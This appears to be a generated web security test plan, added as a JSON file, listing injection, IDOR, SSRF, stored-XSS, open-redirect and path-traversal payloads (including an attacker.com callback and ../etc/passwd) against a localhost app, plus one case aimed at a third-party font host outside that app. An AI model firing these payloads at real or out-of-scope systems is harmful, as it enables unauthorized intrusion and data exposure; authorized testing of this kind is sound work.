@@ -1,0 +1,771 @@
+{
+  "test_cases": [
+    {
+      "id": "TC-H1-pictures-id",
+      "hypothesis_id": "H1",
+      "base_url": "http://localhost:8000",
+      "method": "GET",
+      "endpoint": "/pictures/",
+      "parameter": "_id",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "_id=0"
+            }
+          ],
+          "description": "Baseline: request with benign _id=0 to establish baseline response size and content",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "_id=9999999"
+            }
+          ],
+          "description": "Probe: request with likely-nonexistent id to detect length/status differences",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "_id=1 OR 1=1"
+            }
+          ],
+          "description": "Exploit/probe: manipulated _id to attempt to change returned record set",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Valid session cookie required (observed auth_cookie_session)"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF token may be required for state changes; include if present in cookies/HTML"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "abs(len(response.body) - len(baseline.body)) / (len(baseline.body) if len(baseline.body)>0 else 1) > 0.30",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "reflected_input",
+          "condition": "\"_id=1\" in response.body or \"9999999\" in response.body or \"0\" in response.body",
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "tags": [
+        "information_disclosure",
+        "query_influence"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "TC-H2-pictures-username",
+      "hypothesis_id": "H2",
+      "base_url": "http://localhost:8000",
+      "method": "GET",
+      "endpoint": "/pictures/",
+      "parameter": "username",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "username=mail@example.com"
+            }
+          ],
+          "description": "Baseline: request for own username to capture baseline status and response length",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "username=otheruser"
+            }
+          ],
+          "description": "Probe: request for another username to observe status or content changes",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "username=admin' OR '1'='1"
+            }
+          ],
+          "description": "Exploit/probe: crafted username payload to attempt bypass or widen result set",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Valid session cookie required"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "response.status_code not in baseline.status_codes",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "abs(len(response.body) - len(baseline.body)) / (len(baseline.body) if len(baseline.body)>0 else 1) > 0.40",
+          "threshold": {
+            "body_length_delta_pct": 40.0
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 30
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Respect rate limits; use low frequency",
+      "tags": [
+        "authorization_bypass",
+        "idor"
+      ],
+      "estimated_duration": 90
+    },
+    {
+      "id": "TC-H3-resource_hash",
+      "hypothesis_id": "H3",
+      "base_url": "http://localhost:8000",
+      "method": "GET",
+      "endpoint": "/RESOURCE_HASH_PLACEHOLDER",
+      "parameter": "resource_hash",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "/0215428b1ddcb8dc8fd93e4ced0cab97"
+            }
+          ],
+          "description": "Baseline: request observed resource hash to capture baseline status and response",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+            }
+          ],
+          "description": "Probe: request with different random hash to observe status/code differences",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "/0215428b1ddcb8dc8fd93e4ced0cab98"
+            }
+          ],
+          "description": "Exploit/probe: similar hash variant to attempt access to neighboring resources",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Valid session cookie required"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "response.status_code not in baseline.status_codes",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "reflected_input",
+          "condition": "requested_path_segment in response.body or requested_path_segment in response.headers.get('Location','')",
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 50
+      },
+      "max_retries": 3,
+      "delay_between_requests": 1.0,
+      "notes": "Replace RESOURCE_HASH_PLACEHOLDER with concrete path value when executing. Keep requests low-rate.",
+      "tags": [
+        "authorization_bypass",
+        "path_idor"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "TC-H4-user_info-email",
+      "hypothesis_id": "H4",
+      "base_url": "http://localhost:8000",
+      "method": "GET",
+      "endpoint": "/user_info/",
+      "parameter": "email",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "email=mail@example.com"
+            }
+          ],
+          "description": "Baseline: request with observed email to capture baseline response and sensitive fields",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "email=other@example.com"
+            }
+          ],
+          "description": "Probe: request for different email to check access controls and response content changes",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "email=admin@example.com'}"
+            }
+          ],
+          "description": "Exploit/probe: malformed email input to attempt information disclosure or different account retrieval",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Valid session cookie required"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "abs(len(response.body) - len(baseline.body)) / (len(baseline.body) if len(baseline.body)>0 else 1) > 0.20",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "reflected_input",
+          "condition": "\"mail@example.com\" in response.body or \"other@example.com\" in response.body or \"admin@example.com\" in response.body",
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "tags": [
+        "sensitive_data_exposure"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "TC-H5-user_info-id",
+      "hypothesis_id": "H5",
+      "base_url": "http://localhost:8000",
+      "method": "GET",
+      "endpoint": "/user_info/",
+      "parameter": "_id",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "_id=0"
+            }
+          ],
+          "description": "Baseline: benign _id to capture baseline response",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "_id=2"
+            }
+          ],
+          "description": "Probe: test another numeric id to observe status or content changes",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "_id=1 OR 1=1"
+            }
+          ],
+          "description": "Exploit/probe: manipulated id to attempt to retrieve other user's data",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Valid session cookie required"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "response.status_code not in baseline.status_codes",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "sensitive_data_exposed",
+          "condition": "any(field in response.body for field in ['account_balance','email','is_admin'])",
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 40
+      },
+      "max_retries": 3,
+      "delay_between_requests": 1.0,
+      "tags": [
+        "authorization_bypass",
+        "sensitive_data_exposure"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "TC-H6-upload_photo-ssrf",
+      "hypothesis_id": "H6",
+      "base_url": "http://localhost:8000",
+      "method": "POST",
+      "endpoint": "/upload_photo/",
+      "parameter": "image_url",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "image_url=https://example.com/static.jpg&filename=static.jpg"
+            }
+          ],
+          "description": "Baseline: benign external URL to measure baseline timing and behavior",
+          "encoding": "application/x-www-form-urlencoded",
+          "content_type": "multipart/form-data",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "image_url=https://slow.example.com/delay10s.jpg&filename=probe.jpg"
+            }
+          ],
+          "description": "Probe: point image_url to slow external host to detect timing anomalies",
+          "encoding": "application/x-www-form-urlencoded",
+          "content_type": "multipart/form-data",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "image_url=http://oob-callback.attacker.com/ping&filename=oob.jpg"
+            }
+          ],
+          "description": "Exploit: point image_url to attacker-controlled host to detect HTTP callbacks (OOB)",
+          "encoding": "application/x-www-form-urlencoded",
+          "content_type": "multipart/form-data",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Valid session cookie required"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF token in form required; include token value in request body/header",
+          "extract_from": "GET /upload_photo/ or page HTML",
+          "bind_to": "csrf_token"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "timing_anomaly",
+          "condition": "response.time_ms > baseline.time_ms + 5000",
+          "threshold": {
+            "timing_ms": 5000
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "http_callback",
+          "condition": "OOB service observed incoming HTTP request from target to attacker-controlled host",
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 2,
+      "delay_between_requests": 5.0,
+      "notes": "OOB callback requires external OOB monitoring; ensure CSRF token present. Respect max_requests.",
+      "tags": [
+        "ssrf",
+        "oob"
+      ],
+      "estimated_duration": 600
+    },
+    {
+      "id": "TC-H7-upload_photo-xss",
+      "hypothesis_id": "H7",
+      "base_url": "http://localhost:8000",
+      "method": "POST",
+      "endpoint": "/upload_photo/",
+      "parameter": "description",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "description=benign_description&title=benign_title"
+            }
+          ],
+          "description": "Baseline: benign text to capture baseline rendering and storage behavior",
+          "encoding": "application/x-www-form-urlencoded",
+          "content_type": "multipart/form-data",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "description=<script>/*probe*/</script>&title=probe_title"
+            }
+          ],
+          "description": "Probe: non-executing marker script to check reflection/storage without triggering XSS in browsers (may be escaped)",
+          "encoding": "application/x-www-form-urlencoded",
+          "content_type": "multipart/form-data",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "description=<img src=x onerror=alert(1)>&title=<svg><script>alert(1)</script></svg>"
+            }
+          ],
+          "description": "Exploit: payloads designed to execute if stored and rendered unsafely (only run in controlled environments)",
+          "encoding": "application/x-www-form-urlencoded",
+          "content_type": "multipart/form-data",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Valid session cookie required"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF token in form required; include token value",
+          "extract_from": "GET /upload_photo/ or page HTML",
+          "bind_to": "csrf_token"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "any(mut in response.body for mut in ['benign_description','probe_title','<script>/*probe*/</script>'])",
+          "weight": 0.8
+        },
+        {
+          "signal": "xss_payload_executed",
+          "condition": "evidence of script execution observed in instrumentation or OOB JS callback (if available)",
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 2,
+      "delay_between_requests": 2.0,
+      "notes": "Exploit payload may trigger XSS; run only in controlled testing environments and with consent. Include CSRF token.",
+      "tags": [
+        "stored_xss"
+      ],
+      "estimated_duration": 600
+    },
+    {
+      "id": "TC-H8-login-user-param",
+      "hypothesis_id": "H8",
+      "base_url": "http://localhost:8000",
+      "method": "GET",
+      "endpoint": "/login",
+      "parameter": "user",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "user=mail@example.com"
+            }
+          ],
+          "description": "Baseline: observed user value to capture baseline status and potential redirect behavior",
+          "content_type": "application/x-www-form-urlencoded",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "user=https://example.com/"
+            }
+          ],
+          "description": "Probe: test whether user param is used in redirects or reflected",
+          "content_type": "application/x-www-form-urlencoded",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "user=//attacker.com"
+            }
+          ],
+          "description": "Exploit: redirect-style payload to detect open-redirect or injection behavior",
+          "content_type": "application/x-www-form-urlencoded",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "requested_query_value in response.body or requested_query_value in response.headers.get('Location','')",
+          "weight": 0.8
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "response.status_code not in baseline.status_codes",
+          "threshold": {
+            "expected_codes": [
+              200,
+              302,
+              400
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 1,
+      "delay_between_requests": 1.0,
+      "tags": [
+        "open_redirect",
+        "injection"
+      ],
+      "estimated_duration": 30
+    },
+    {
+      "id": "TC-H9-css-family",
+      "hypothesis_id": "H9",
+      "base_url": "https://fonts.googleapis.com",
+      "method": "GET",
+      "endpoint": "/css",
+      "parameter": "family",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "family=Titillium+Web:400"
+            }
+          ],
+          "description": "Baseline: benign font family to capture baseline response",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "family=../../../../etc/passwd"
+            }
+          ],
+          "description": "Probe: path-traversal style value to detect inclusion/reflection or error conditions",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "family=<script>probe</script>"
+            }
+          ],
+          "description": "Exploit: injection-style payload to detect reflection in CSS or HTML",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "requested_query_value in response.body",
+          "weight": 0.7
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "abs(len(response.body) - len(baseline.body)) / (len(baseline.body) if len(baseline.body)>0 else 1) > 0.30",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 1,
+      "delay_between_requests": 1.0,
+      "notes": "Requests target fonts.googleapis.com; outbound domain observed in HAR. Keep low rate.",
+      "tags": [
+        "injection",
+        "resource_inclusion"
+      ],
+      "estimated_duration": 30
+    }
+  ],
+  "global_prerequisites": [
+    {
+      "type": "login",
+      "description": "Obtain valid session cookie by performing form login at /login if required; bind session cookie to subsequent requests",
+      "extract_from": "/login response set-cookie",
+      "bind_to": "session_cookie"
+    },
+    {
+      "type": "csrf_token",
+      "description": "If forms require CSRF token, extract token from login or upload_photo page HTML and bind to requests as form field or header",
+      "extract_from": "/login or /upload_photo/ page HTML",
+      "bind_to": "csrf_token"
+    }
+  ],
+  "execution_hints": [
+    {
+      "key": "rate_limit",
+      "value": "delay_between_requests specified per test; do not exceed max_requests"
+    },
+    {
+      "key": "oob",
+      "value": "H6 requires OOB HTTP callback monitoring (external rendezvous)"
+    }
+  ],
+  "metadata": [
+    {
+      "key": "source",
+      "value": "har_parsed_spa"
+    },
+    {
+      "key": "notes",
+      "value": "Many endpoints require cookie-based session; several parameters lacked concrete sample values—needs further observation for targeted IDs"
+    }
+  ]
+}
